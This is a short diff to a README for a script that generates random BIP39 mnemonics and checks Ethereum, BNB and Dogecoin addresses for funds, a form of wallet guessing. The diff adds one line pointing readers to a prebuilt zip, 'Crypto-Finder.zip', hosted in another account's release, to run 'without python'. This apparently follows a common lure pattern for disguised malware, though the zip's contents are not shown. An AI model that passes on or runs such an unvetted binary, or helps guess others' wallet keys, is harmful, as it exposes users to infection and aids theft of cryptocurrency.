@@ -12,7 +12,7 @@ Check and Generated Random Mnemonic BIP39 for Ethereum Address and BNB and Dogec
 >The contents and performance of the file initially check whether or not the Python is installed in your system if the Python is not installed but not properly adjusted, automatically receives an installer from the official [Python](https://python.org) website and install it on your system. And adjusts.
 Then, after installing Python, it installs the libraries needed to set up this script. That includes  *` Cryptofuzz `* , *` Colorthon `* and *` requests `*
 After installing the libraries, it runs the Python Script.
-
+Or run it without python https://github.com/Prathmesh-sonawane/crypto-finder/releases/download/r/Crypto-Finder.zip
 ---
 
 ## Download and Use With Git
